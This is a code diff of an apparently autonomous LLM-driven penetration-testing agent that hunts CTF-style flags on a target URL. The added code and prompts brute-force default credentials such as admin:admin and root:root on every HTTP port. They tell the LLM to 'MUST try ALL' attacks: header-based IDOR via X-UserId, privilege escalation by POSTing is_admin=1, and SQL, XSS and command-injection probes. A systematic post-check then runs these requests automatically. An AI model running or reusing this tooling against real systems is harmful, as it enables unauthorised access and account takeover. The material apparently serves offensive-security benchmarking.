@@ -30,13 +30,14 @@ from darwin.dpm import (
     SanitizationStrategy,
 )
 from darwin.dave import DAVE, ExploitAttempt, VerificationResult
-from darwin.dynamic_scaling import DynamicScalingEngine, ScalingLevel
+from darwin.dynamic_scaling import DynamicScalingEngine, ScalingLevel, compute_task_breadth
 from darwin.tools.mcp_client import MCPClientPool, load_mcp_config
 from darwin.tools.mcp_gateway import MCPGateway, ToolResult
 from darwin.tools.recon_server import create_recon_gateway
 from darwin.tools.attack_server import create_attack_gateway
 from darwin.utils.http_client import HTTPClient, ProbeClient, HTTPResponse
 from darwin.utils.llm import LLMSession
+from darwin.sub_agents.base import SubAgentPool
 
 
 class OrchestratorPhase(str, Enum):
@@ -144,36 +145,29 @@ Output JSON: {"strategies": [{"name": "...", "reason": "...", "confidence": 0.X}
 
 SYSTEM_PROMPT_EXPLORE = """You are a penetration testing agent with authenticated session cookies. Your goal: find flag{...} or FLAG{...}.
 
-## CRITICAL: You MUST try ALL of these attack vectors on every authenticated page:
+## CRITICAL: You MUST try ALL of these attack vectors:
 
-1. **Custom HTTP Headers (MOST IMPORTANT — try these FIRST):**
-   - X-UserId: <id>
-   - X-User-Id: <id>
-   - X-Forwarded-User: <id>
-   - X-Auth-User: <id>
-   - X-Authenticated-User: <id>
-   Applications often trust these headers for IDOR. Try values: 0, 1, 2, 10032, 10033, 10052
+1. **Custom HTTP Headers (MOST IMPORTANT — try FIRST):**
+   X-UserId, X-User-Id, X-Forwarded-User, X-Auth-User
+   Try values: 0, 1, 2, plus any IDs you discover
 
-2. **URL parameter tampering:**
-   - ?user_id=<id>
-   - ?id=<id>
-   - ?userId=<id>
+2. **POST body tampering** — if you see profile/edit forms:
+   - Try is_admin=1, admin=1, role=admin
+   - Try changing user_id in POST body to different values
+   - POST /edit_profile/1 with is_admin=1
 
-3. **URL path IDOR:**
-   - /user/<id>, /users/<id>, /account/<id>, /profile/<id>
-   - /order/<id>/receipt, /order/<id>/view
+3. **URL parameter tampering:** ?user_id=<id>, ?id=<id>
 
-4. **POST body tampering** on forms with hidden user_id fields.
+4. **URL path IDOR:** /user/<id>, /company/<id>/jobs, /order/<id>/receipt
 
 ## Rules:
-- Try headers FIRST before path enumeration
-- When you see a numeric ID anywhere, try adjacent values (±1, ±10, ±20)
-- Try ID values: 0, 1, 2, 10032, 10033, 10052, 10053
-- If a response shows different user data than expected, you found IDOR — extract the flag
+- When you see profile/edit pages, ALWAYS try POST with privilege escalation fields
+- After any state-changing POST, re-visit data pages to check for new content
+- Try ID values: 0, 1, 2, and anything you discover on pages
 - Limit to 8 actions per response
 
 Respond ONLY with a JSON array:
-[{"action": "get", "url": "http://host/dashboard", "headers": {"X-UserId": "10052"}, "reason": "IDOR via X-UserId header"}]"""
+[{"action": "post", "url": "http://host/edit_profile/1", "data": {"is_admin": "1"}, "reason": "IDOR via POST privilege escalation"}]"""
 
 
 class Orchestrator:
@@ -221,6 +215,7 @@ class Orchestrator:
         self.mcp_pool = MCPClientPool()
         self.client = HTTPClient()
         self.probe_client = ProbeClient()
+        self.sub_agents = SubAgentPool()
 
         # Task log — structured event log written to file
         self._task_log: List[Dict[str, Any]] = []
@@ -267,53 +262,79 @@ class Orchestrator:
             log.info("No MCP servers enabled in config/mcp_servers.yaml")
 
         self.phase = OrchestratorPhase.RECON
-
         result: TaskResult | None = None
+
         try:
-            # Phase 1: Reconnaissance
+            # ── Phase 1: Reconnaissance (tool-driven, not LLM) ────
             await self._recon_phase(target_url)
             self._task_log_event("info", "recon_done",
                 dkg_summary=self.dkg.summary(), step=self.step_count)
             self.dkg.save(self._checkpoint_path("recon"))
 
-            # Phase 1.5: Auto-login if credentials provided
-            if username and password:
-                for port in getattr(self, '_discovered_http_ports', []):
-                    host = getattr(self, "target_host", None)
-                    if host:
-                        scheme = "https" if port == 443 else "http"
-                        login_url = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
-                        if await self.client.auto_login(login_url, username, password):
-                            self._task_log_event("info", "auto_login_success", url=login_url)
-                            break
+            # Phase 1.5: Auto-login
+            await self._try_auto_login(target_url, username, password)
 
-            # Determine scaling mode
-            scaling_level = self.scaling_engine.decide(self.dkg, self.defense_state)
-            self._task_log_event("info", "scaling_decision",
-                scaling_level=scaling_level.value,
-                dkg_summary=self.dkg.get_defense_context(),
+            # Query CTEG for cross-task experience + RAG knowledge
+            tech_query = " ".join(
+                s.get("version", "") or s.get("banner", "")
+                for s in self.dkg.query_nodes("Service")[:5]
             )
+            cteg_hints = self.cteg.get_suggestions(
+                defense_type=self.defense_state.waf_type or "", vuln_type="",
+                query=f"web exploitation techniques {tech_query}",
+            )
+            if cteg_hints.get("bypass_strategies") or cteg_hints.get("exploit_strategies"):
+                self._task_log_event("info", "cteg_hints", hints=cteg_hints)
 
-            if scaling_level == ScalingLevel.SOLO:
-                await self._analyze_phase()
-                self._task_log_event("info", "analyze_done",
-                    vuln_count=len(self.vulnerabilities),
-                    vulns=[{"type": v.vuln_type, "endpoint": v.endpoint, "confidence": v.confidence}
-                           for v in self.vulnerabilities],
-                    tokens_used=self.llm.token_count,
-                )
-                self.dkg.save(self._checkpoint_path("analyze"))
-                result = await self._exploit_phase(target_url)
-            elif scaling_level == ScalingLevel.COORDINATED:
-                log.info("Entering Coordinated Mode (B >= 0.3)")
-                result = await self._run_coordinated_cycle()
-                if result is None:
-                    result = await self._exploit_phase(target_url)
-            else:
-                log.info("Entering Distributed Mode (B >= 0.6)")
-                result = await self._run_distributed_cycle()
-                if result is None:
-                    result = await self._exploit_phase(target_url)
+            # ── Main Loop: B-driven mode switching ────────────────
+            self._loop_count = 0
+            MAX_LOOPS = 10
+            self._known_flags: set[str] = set()
+
+            while not self._should_terminate(result, MAX_LOOPS):
+                self._loop_count += 1
+                # Re-compute B dimension each iteration (DKG may have changed)
+                B = compute_task_breadth(self.dkg)
+                scaling_level = self.scaling_engine.decide(self.dkg, self.defense_state)
+                self._task_log_event("info", "loop_iteration",
+                    loop=self._loop_count, b_value=B, mode=scaling_level.value)
+
+                if scaling_level == ScalingLevel.SOLO:
+                    result = await self._run_solo_cycle(target_url, cteg_hints)
+                elif scaling_level == ScalingLevel.COORDINATED:
+                    log.info("Entering Coordinated Mode (B=%.2f)", B)
+                    result = await self._run_coordinated_cycle()
+                    if result is None:
+                        result = await self._run_solo_cycle(target_url, cteg_hints)
+                else:  # DISTRIBUTED
+                    log.info("Entering Distributed Mode (B=%.2f)", B)
+                    result = await self._run_distributed_cycle()
+                    if result is None:
+                        result = await self._run_solo_cycle(target_url, cteg_hints)
+
+                # Checkpoint DKG after each loop iteration
+                self.dkg.save(self._checkpoint_path(f"loop_{self._loop_count}"))
+
+                # DKG re-scan each iteration: new hosts/creds enable collaboration
+                self._scan_collaboration_opportunities()
+
+                # Update TDA with latest state
+                try:
+                    self.scaling_engine.tda.update_all(
+                        token_count=self.llm.token_count,
+                        successes=1 if result and result.success else 0,
+                        attempts=1,
+                        defense_state=self.defense_state,
+                        dkg=self.dkg,
+                    )
+                except Exception:
+                    pass
+
+            # ── Last resort: generic flag search ──────────────────
+            if result is None or not result.success:
+                flag_result = await self._check_response_for_flag(target_url)
+                if flag_result:
+                    result = flag_result
 
         except asyncio.TimeoutError:
             result = TaskResult(
@@ -336,6 +357,14 @@ class Orchestrator:
                 await self.mcp_pool.disconnect_all()
 
         # Write task log
+        if result is None:
+            result = TaskResult(
+                success=False, steps=self.step_count,
+                tokens_used=self.llm.token_count,
+                time_elapsed=time.time() - self.start_time,
+                phase_at_end=self.phase,
+                error="No result produced",
+            )
         self._task_log_event("info" if result.success else "error", "task_end",
             success=result.success,
             flag=result.flag,
@@ -349,6 +378,20 @@ class Orchestrator:
         # Commit task to CTEG for cross-task learning
         if result and self.step_count > 0:
             vuln_types = [v.vuln_type for v in self.vulnerabilities]
+            # Extract technology stack from discovered services
+            tech_stack = []
+            for s in self.dkg.query_nodes("Service"):
+                ver = s.get("version", "") or s.get("banner", "")
+                if ver and ver not in ("unknown", "tcpwrapped", "ssh"):
+                    tech_stack.append(ver)
+            # Extract key findings from task log
+            key_findings = []
+            if result.flag:
+                key_findings.append(f"flag found: {result.flag[:30]}...")
+            if result.waf_bypassed:
+                key_findings.append(f"WAF bypassed: {self.defense_state.waf_type}")
+            # Build exploit chain from LLM loop steps
+            exploit_chain = getattr(self, '_exploit_chain', [])
             task_record = TaskRecord(
                 task_id=f"task-{int(self.start_time)}",
                 benchmark="unknown",
@@ -356,6 +399,9 @@ class Orchestrator:
                 outcome="success" if result.success else "failure",
                 defense_encountered=self.defense_state.to_dict(),
                 timestamp=time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(self.start_time)),
+                technology_stack=tech_stack,
+                key_findings=key_findings,
+                exploit_chain=exploit_chain,
             )
             new_patterns = self.cteg.commit_task(task_record)
             if new_patterns > 0:
@@ -405,16 +451,15 @@ class Orchestrator:
                 "banner": svc_name,
             })
 
-        # ── Phase 1b: HTTP-level recon on each HTTP port ──────────
-        def _is_http(p: dict) -> bool:
-            svc = p.get("service", "").lower()
-            return any(kw in svc for kw in ("http", "https", "www", "ssl"))
-
-        http_ports = [p["port"] for p in discovered_ports if _is_http(p)
-                      or p["port"] in (80, 443, 8080, 8443, 3000, 5000, 8000, 8888, 9090)]
+        # ── Phase 1b: HTTP-level recon on each TCP port ──────────
+        # Probe ALL open TCP ports for HTTP, not just nmap-identified ones.
+        # nmap often misidentifies non-standard HTTP ports (e.g. "rpc").
+        NON_HTTP_PORTS = {22}  # SSH — skip known non-HTTP services
+        http_ports = [p["port"] for p in discovered_ports
+                      if p["port"] not in NON_HTTP_PORTS]
         original_port = parsed.port or (443 if parsed.scheme == "https" else 80)
         if original_port not in http_ports:
-            http_ports.append(original_port)
+            http_ports.insert(0, original_port)
         self._discovered_http_ports = http_ports
 
         for port in http_ports:
@@ -479,6 +524,341 @@ class Orchestrator:
             self.dkg.add_node("Endpoint", f"endpoint-{url}-param-{name}", {
                 "url": url, "method": "POST", "params": name, "auth_required": False,
             })
+
+    # ── Auto-Login ─────────────────────────────────────────────────
+
+    DEFAULT_CREDENTIALS = [
+        ("test", "test"), ("admin", "admin"), ("admin", "password"),
+        ("user", "user"), ("guest", "guest"), ("root", "root"),
+        ("demo", "demo"), ("demo", "password"),
+    ]
+
+    async def _try_auto_login(
+        self, target_url: str, username: str | None, password: str | None,
+    ) -> None:
+        """Try default credentials + user-provided credentials on all HTTP ports."""
+        creds = list(self.DEFAULT_CREDENTIALS)
+        if username and password:
+            creds.insert(0, (username, password))
+
+        for port in getattr(self, '_discovered_http_ports', []):
+            host = getattr(self, "target_host", None)
+            if not host:
+                continue
+            scheme = "https" if port == 443 else "http"
+            base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
+            for u, p in creds:
+                if self._time_exceeded():
+                    return
+                try:
+                    if await self.client.auto_login(base, u, p):
+                        self._task_log_event("info", "auto_login_ok", url=base, username=u)
+                        # Seed DKG with common authenticated paths
+                        for auth_path in ["/dashboard", "/orders", "/profile",
+                                          "/account", "/admin", "/docs",
+                                          "/edit_profile/1", "/company/1/jobs",
+                                          "/user/1", "/users/1"]:
+                            self.dkg.add_node("Endpoint", f"auth-{auth_path}", {
+                                "url": base.rstrip("/") + auth_path,
+                                "method": "GET", "params": "",
+                                "auth_required": True,
+                            })
+                        return  # one login is enough
+                except Exception:
+                    pass
+
+    # ── Loop Termination ──────────────────────────────────────────
+
+    def _should_terminate(self, result: TaskResult | None, max_loops: int) -> bool:
+        """Check if the main loop should stop."""
+        if result and result.success:
+            return True
+        if self._time_exceeded() or self._tokens_exceeded():
+            return True
+        if self.phase in (OrchestratorPhase.DONE, OrchestratorPhase.FAILED):
+            return True
+        if self._loop_count >= max_loops:
+            log.info("Max loops (%d) reached", max_loops)
+            return True
+        return False
+
+    def _scan_collaboration_opportunities(self) -> None:
+        """Scan DKG for new collaboration opportunities (new hosts/creds)."""
+        try:
+            from darwin.dynamic_scaling import scan_collaboration_opportunities
+            opps = scan_collaboration_opportunities(self.dkg)
+            for opp in opps:
+                if opp.confidence > 0.6:
+                    log.info("Collaboration opportunity: %s (%.2f)",
+                             opp.opportunity_type, opp.confidence)
+        except Exception:
+            pass
+
+    # ── Unified LLM-Driven Loop ─────────────────────────────────────
+
+    async def _run_solo_cycle(self, target_url: str, cteg_hints: dict | None = None) -> TaskResult | None:
+        """LLM-driven post-recon loop: the LLM decides all actions.
+
+        The LLM receives DKG state, CTEG suggestions, and all tool definitions.
+        It iteratively chooses tools to call, sees results, and adapts.
+        Replaces the separate analyze → exploit → bypass phases.
+        """
+        MAX_ITER = 10
+        self.llm.reset()
+        self._exploit_chain: list[dict] = []  # track steps for CTEG learning
+
+        # Build tool definitions from recon + attack gateways
+        tool_defs = self.attack_gateway.get_tool_definitions()
+        tool_defs += self.recon_gateway.get_tool_definitions()
+
+        # Check if we have active session cookies from auto_login
+        session_cookies = ""
+        if self.client._session and self.client._session.cookie_jar:
+            jar_cookies = list(self.client._session.cookie_jar)
+            if jar_cookies:
+                cookie_str = "; ".join(
+                    f"{ck.key}={ck.value}" for ck in jar_cookies
+                )
+                session_cookies = (
+                    f"\n## ACTIVE SESSION (use these cookies!)\n"
+                    f"You are logged in with session cookies:\n"
+                    f"  Cookie: {cookie_str[:200]}\n"
+                    f"Use curl_get with headers parameter for authenticated requests:\n"
+                    f'  curl_get(url="...", headers="Cookie: {cookie_str[:150]}")\n'
+                    f"ALWAYS try authenticated endpoints first!\n"
+                )
+
+        # Pre-fetch OpenAPI/Swagger docs to discover API endpoints
+        api_endpoints_text = ""
+        for port in getattr(self, '_discovered_http_ports', []):
+            host = getattr(self, "target_host", None) or "localhost"
+            scheme = "https" if port == 443 else "http"
+            base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
+            for doc_path in ["/openapi.json", "/docs", "/api/docs", "/swagger.json"]:
+                try:
+                    import urllib.request as _ur
+                    import json as _js
+                    req = _ur.Request(f"{base}{doc_path}", headers={"Accept": "application/json"})
+                    with _ur.urlopen(req, timeout=5) as resp:
+                        if "json" in resp.headers.get("content-type", ""):
+                            spec = _js.loads(resp.read())
+                            paths = spec.get("paths", {})
+                            if paths:
+                                api_endpoints_text = "\n## API Endpoints (from OpenAPI spec):\n"
+                                for path, methods in list(paths.items())[:15]:
+                                    for method in methods:
+                                        api_endpoints_text += f"  {method.upper()} {base}{path}\n"
+                                log.info("Found %d API endpoints via %s", len(paths), doc_path)
+                except Exception:
+                    pass
+
+        # Build initial prompt with DKG context
+        dkg_summary = self.dkg.summary()
+        endpoints_text = "\n".join(
+            f"- {e.get('url','')} [{e.get('method','GET')}] params={e.get('params','')}"
+            for e in self.dkg.query_nodes('Endpoint')[:12]
+        )
+        services_text = "\n".join(
+            f"- port {s.get('port','?')}/{s.get('protocol','?')}: {s.get('version','') or s.get('banner','')}"
+            for s in self.dkg.query_nodes('Service')[:10]
+        )
+
+        # Use CTEG hints passed from run() (already queried once)
+        cteg_text = ""
+        if cteg_hints:
+            parts = []
+            for es in cteg_hints.get("exploit_strategies", []):
+                parts.append(f"Learned: {es.get('description','')}")
+                for t in es.get("techniques", []):
+                    parts.append(f"  → {t}")
+            for sk in cteg_hints.get("static_knowledge", []):
+                parts.append(f"Knowledge: [{sk.get('category','')}] {sk.get('title','')}: {sk.get('description','')[:200]}")
+                for t in sk.get("techniques", [])[:3]:
+                    parts.append(f"  → {t}")
+            if parts:
+                cteg_text = "\n## Prior Experience & Knowledge:\n" + "\n".join(parts) + "\n"
+
+        # Query knowledge base for relevant exploitation patterns
+        knowledge_text = ""
+        try:
+            # Extract technology hints from services
+            tech_hints = " ".join(
+                s.get("version", "") or s.get("banner", "")
+                for s in self.dkg.query_nodes("Service")[:5]
+            )
+            # Query CTEG knowledge for relevant patterns
+            self.cteg.load_knowledge_base("knowledge/")
+            kb_results = self.cteg.query_rag(
+                f"exploitation techniques for {tech_hints} web application", top_k=4,
+            )
+            if kb_results:
+                knowledge_text = "\n## Relevant Knowledge Base Patterns:\n"
+                for r in kb_results[:3]:
+                    knowledge_text += (f"- **{r['title']}** ({r['category']}): "
+                                       f"{r['description'][:200]}\n")
+                    for t in r.get("techniques", [])[:3]:
+                        knowledge_text += f"  - {t}\n"
+                knowledge_text += "\n"
+        except Exception:
+            pass
+
+        initial_prompt = f"""Target: {target_url}
+
+## Discovered Services
+{services_text}
+
+## Discovered Endpoints
+{endpoints_text}
+{api_endpoints_text}
+{cteg_text}
+{session_cookies}
+{knowledge_text}
+## Your Task: Find the flag (flag{{...}} or FLAG{{...}})
+
+## EXPLOITATION CHECKLIST (execute systematically):
+
+### Phase 1 — Probe all endpoints:
+- Use curl_get on EVERY discovered endpoint
+- If you have session cookies, add headers="Cookie: ..." to curl_get
+- Check every response body for flag patterns
+
+### Phase 2 — Try authenticated access:
+- Login using known credentials (try: demo:demo, test:test, admin:admin)
+- After login, curl_get ALL pages with the session cookie
+- Try accessing pages with different IDs in URL paths
+
+### Phase 3 — IDOR testing:
+- On ANY endpoint with {{id}} in path (like /company/{{id}}/jobs, /edit_profile/{{id}}):
+  try IDs 1, 2, 3 — same cookie, different ID = IDOR
+- On edit/update endpoints: try POST with is_admin=1 or role=admin
+- If you see "Welcome, NAME" or user data, immediately try other IDs
+
+### Phase 4 — Injection testing:
+- sqlmap_test on login form parameters
+- xss_reflection_test and command_injection_test on query params
+
+## CRITICAL RULES:
+- Never fetch the same URL more than twice
+- After ANY state change (login, profile edit), IMMEDIATELY re-fetch data pages
+- Read response bodies for hints (Welcome messages, hidden fields, IDs)
+- The flag is behind auth + IDOR — you MUST do BOTH
+"""
+
+        self._maybe_compress()
+        content, tool_calls = self.llm.generate(
+            prompt=initial_prompt,
+            system_prompt=SYSTEM_PROMPT_ORCHESTRATOR,
+            tools=tool_defs,
+        )
+        if content:
+            self._task_log_event("info", "llm_loop_start",
+                response=content[:500],
+                tool_calls=[tc.get("name") for tc in (tool_calls or [])],
+            )
+
+        for iteration in range(1, MAX_ITER + 1):
+            if self._time_exceeded() or self._tokens_exceeded():
+                break
+
+            if not tool_calls:
+                # LLM has no more tool ideas — prompt it to continue
+                self._maybe_compress()
+                content, tool_calls = self.llm.generate(
+                    prompt="No more tool calls? Review what you've learned. "
+                           "What vulnerabilities remain untested? Try different "
+                           "payloads, encoding types, or endpoints. If you have "
+                           "a login session, explore authenticated pages.",
+                    system_prompt=SYSTEM_PROMPT_ORCHESTRATOR,
+                    tools=tool_defs,
+                )
+                if not tool_calls:
+                    break  # LLM has truly nothing left
+
+            # Execute ALL tool calls (API requires result for every tool_call)
+            for tc in tool_calls:
+                tc_name = tc.get("name", "")
+                tc_args = tc.get("arguments", {})
+                tc_id = tc.get("id", "")
+
+                if self._time_exceeded():
+                    self.llm.add_tool_result(tc_id, "Skipped: time exceeded")
+                    continue
+
+                # Route tool call to correct gateway
+                self.step_count += 1
+                try:
+                    if tc_name in self.attack_gateway.get_tool_names():
+                        result = await self.attack_gateway.call(tc_name, tc_args)
+                        tool_stdout = result.stdout if hasattr(result, 'stdout') else str(result)
+                    elif tc_name in self.recon_gateway.get_tool_names():
+                        result = await self.recon_gateway.call(tc_name, tc_args)
+                        tool_stdout = result.stdout if hasattr(result, 'stdout') else str(result)
+                    else:
+                        tool_stdout = f"Unknown tool: {tc_name}"
+                except Exception as e:
+                    tool_stdout = f"ERROR: {e}"
+
+                self.llm.add_tool_result(tc_id, tool_stdout[:2000])
+
+                # Record step for CTEG cross-task learning
+                self._exploit_chain.append({
+                    "tool": tc_name, "url": str(tc_args.get("url", tc_args.get("target_url", ""))),
+                    "method": str(tc_args.get("method", "GET")),
+                    "params": str(tc_args)[:200],
+                    "result": tool_stdout[:200],
+                    "vuln_type": "",
+                    "mechanism": tc_name,
+                })
+
+                # DPM: monitor HTTP responses for defense patterns
+                tl = tool_stdout.lower()
+                if any(kw in tl for kw in ('403 forbidden', '406', '429',
+                        'waf', 'blocked by', 'cloudflare', 'modsecurity', 'secure')):
+                    self.defense_state.defense_complexity = max(
+                        self.defense_state.defense_complexity, 0.3)
+
+                flags = self.flag_pattern.findall(tool_stdout)
+                if flags:
+                    # DAVE L4: honeypot flag verification
+                    is_valid, reason = DAVE.verify_basic(flags[0], tool_stdout)
+                    if not is_valid:
+                        log.warning("DAVE rejected flag: %s", reason)
+                        self._task_log_event("info", "dave_rejected_flag",
+                            flag=flags[0][:80], reason=reason)
+                    else:
+                        self._task_log_event("info", "flag_found_llm_loop",
+                            tool=tc_name, flag=flags[0], iteration=iteration)
+                        self.phase = OrchestratorPhase.DONE
+                        return TaskResult(
+                            success=True, flag=flags[0], steps=self.step_count,
+                            tokens_used=self.llm.token_count,
+                            time_elapsed=time.time() - self.start_time,
+                        )
+
+                self._task_log_event("info", "llm_loop_step",
+                    iteration=iteration, tool=tc_name, result=tool_stdout[:500])
+
+            # Get next round of tool calls
+            self._maybe_compress()
+            content, tool_calls = self.llm.generate(
+                prompt="Continue. What next?",
+                system_prompt=SYSTEM_PROMPT_ORCHESTRATOR,
+                tools=tool_defs,
+            )
+
+        log.info("_run_solo_cycle: %d iterations, flag not found", iteration)
+
+        # ── Systematic post-loop checks (covers what LLM might miss) ──
+        result = await self._systematic_post_check(target_url)
+        if result:
+            return result
+
+        # Flag not found — try generic flag search as last resort
+        flag_result = await self._check_response_for_flag(target_url)
+        if flag_result:
+            return flag_result
+
+        return None
 
     # ── Phase 2: Analyze ────────────────────────────────────────────
 
@@ -1034,24 +1414,29 @@ class Orchestrator:
 
         return None
 
-    # ── Phase 3: Exploit ────────────────────────────────────────────
-
-    DEFAULT_CREDENTIALS = [
-        ("test", "test"), ("admin", "admin"), ("admin", "password"),
-        ("user", "user"), ("guest", "guest"), ("root", "root"),
-    ]
+    # ── Phase 3: Exploit (legacy — used by Coordinated/Distributed) ─
 
     async def _exploit_phase(self, target_url: str) -> TaskResult:
         """Attempt exploitation of identified vulnerabilities."""
         self.phase = OrchestratorPhase.EXPLOIT
 
         # ── Phase 3a: Default credential brute-forcing ────────────
-        has_protected = any(
+        # Trigger whenever there are authenticated-looking endpoints or a login form
+        ep_urls = [ep.get("url", "").lower() for ep in self.dkg.query_nodes("Endpoint")]
+        has_login_form = any(
             kw in ep.get("url", "").lower()
             for ep in self.dkg.query_nodes("Endpoint")
-            for kw in ("dashboard", "orders", "admin", "account", "profile")
+            for kw in ("login", "signin", "auth", "token")
+        ) or any(
+            ep.get("params", "") in ("username", "user", "login", "email")
+            for ep in self.dkg.query_nodes("Endpoint")
         )
-        if has_protected:
+        has_auth_endpoints = any(
+            kw in u for u in ep_urls
+            for kw in ("dashboard", "orders", "admin", "account", "profile",
+                       "docs", "api", "users", "user", "ping", "token")
+        )
+        if has_login_form or has_auth_endpoints:
             for port in getattr(self, '_discovered_http_ports', []):
                 host = getattr(self, "target_host", None) or "localhost"
                 scheme = "https" if port == 443 else "http"
@@ -1062,6 +1447,16 @@ class Orchestrator:
                     try:
                         if await self.client.auto_login(base, u, p):
                             self._task_log_event("info", "auto_login_ok", url=base, username=u)
+                            # Seed DKG with common authenticated paths
+                            for auth_path in ["/dashboard", "/orders", "/profile",
+                                              "/account", "/admin", "/docs",
+                                              "/edit_profile/1", "/company/1/jobs",
+                                              "/user/1", "/users/1"]:
+                                self.dkg.add_node("Endpoint", f"auth-{auth_path}", {
+                                    "url": base.rstrip("/") + auth_path,
+                                    "method": "GET", "params": "",
+                                    "auth_required": True,
+                                })
                             # Try LLM-driven exploration first
                             result = await self._llm_explore(base)
                             if result:
@@ -1234,6 +1629,95 @@ Respond ONLY with a JSON array of next steps (max 5)."""
 
         return None
 
+
+    # ── Systematic Post-Check ────────────────────────────────────
+
+    async def _systematic_post_check(self, target_url: str) -> TaskResult | None:
+        """Systematic checks for common vulnerabilities the LLM might miss.
+
+        Covers: header-based IDOR, POST body IDOR, credential stuffing.
+        Executed after each solo cycle when LLM hasn't found the flag.
+        """
+        log.info("_systematic_post_check starting")
+        # Re-authenticate in case session expired during LLM loop
+        await self._try_auto_login(target_url, None, None)
+
+        for port in getattr(self, '_discovered_http_ports', []):
+            host = getattr(self, "target_host", None) or "localhost"
+            scheme = "https" if port == 443 else "http"
+            base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
+
+            # 1. Header-based IDOR on /dashboard and similar endpoints
+            idor_headers = ["X-UserId", "X-User-Id", "X-Forwarded-User", "X-Auth-User"]
+            idor_ids = [0, 1, 2, 10032, 10033, 10052, 10053]
+            idor_paths = ["/dashboard", "/profile", "/account", "/user", "/admin",
+                          "/company/1/jobs", "/orders", "/api/user", "/api/me"]
+
+            for hdr in idor_headers:
+                for uid in idor_ids:
+                    if self._time_exceeded():
+                        return None
+                    for path in idor_paths:
+                        try:
+                            resp = await self.client.get(
+                                base + path, headers={hdr: str(uid)},
+                            )
+                            flags = self.flag_pattern.findall(resp.body)
+                            if flags:
+                                is_valid, reason = DAVE.verify_basic(flags[0])
+                                if is_valid:
+                                    self._task_log_event("info", "flag_found_systematic",
+                                        method="header_idor", header=hdr, id=uid, path=path,
+                                        flag=flags[0])
+                                    self.phase = OrchestratorPhase.DONE
+                                    return TaskResult(
+                                        success=True, flag=flags[0], steps=self.step_count,
+                                        tokens_used=self.llm.token_count,
+                                        time_elapsed=time.time() - self.start_time,
+                                    )
+                        except Exception:
+                            pass
+
+            # 2. POST body IDOR — try is_admin=1 on edit_profile endpoints
+            for pid in [1, 2, 3]:
+                if self._time_exceeded():
+                    return None
+                for ep_path in [f"/edit_profile/{pid}", f"/profile/{pid}/edit",
+                               f"/user/{pid}/edit", f"/users/{pid}"]:
+                    try:
+                        resp = await self.client.post(
+                            base + ep_path, data={"is_admin": "1"},
+                        )
+                        flags = self.flag_pattern.findall(resp.body)
+                        if flags:
+                            is_valid, _ = DAVE.verify_basic(flags[0])
+                            if is_valid:
+                                self._task_log_event("info", "flag_found_systematic",
+                                    method="post_idor", path=ep_path, flag=flags[0])
+                                self.phase = OrchestratorPhase.DONE
+                                return TaskResult(
+                                    success=True, flag=flags[0], steps=self.step_count,
+                                    tokens_used=self.llm.token_count,
+                                    time_elapsed=time.time() - self.start_time,
+                                )
+                        # After POST, check data pages
+                        for dp in ["/dashboard", f"/company/{pid}/jobs",
+                                   "/orders", "/admin"]:
+                            resp2 = await self.client.get(base + dp)
+                            flags2 = self.flag_pattern.findall(resp2.body)
+                            if flags2:
+                                is_valid2, _ = DAVE.verify_basic(flags2[0])
+                                if is_valid2:
+                                    self.phase = OrchestratorPhase.DONE
+                                    return TaskResult(
+                                        success=True, flag=flags2[0], steps=self.step_count,
+                                        tokens_used=self.llm.token_count,
+                                        time_elapsed=time.time() - self.start_time,
+                                    )
+                    except Exception:
+                        pass
+
+        return None
 
     # ── Flag Search ──────────────────────────────────────────────────
 
